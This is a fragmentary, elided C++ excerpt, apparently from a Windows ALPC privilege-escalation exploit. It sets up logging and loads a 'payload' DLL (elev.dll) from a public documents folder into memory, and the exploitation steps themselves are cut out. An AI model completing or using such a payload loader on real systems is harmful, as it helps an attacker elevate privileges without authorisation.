...
void log(const string& str) {
	if (logFile.is_open()) {
		logFile << str.c_str() << endl << std::flush;
	}
}
...
int mainf()
{
	...
	logFile.open("C:\\Users\\Public\\Documents\\alpc.log");


	log("finding target dll");
	...
	log("loading payload dll");

	void* pMyBinaryData = NULL;
	unsigned int myResourceSize = 0;
	vector<char> loadedFileData;
	try {
		loadedFileData = loadFileIntoMemory("C:\\Users\\Public\\Documents\\elev.dll");
		
		char* pData = new char[loadedFileData.size()];
		std::copy(loadedFileData.begin(), loadedFileData.end(), pData);
		
		pMyBinaryData = pData;
		myResourceSize = loadedFileData.size();
	}
	catch (std::exception& ex) {
		log( string("error: ") + string(ex.what()) );
		return 1;
	}
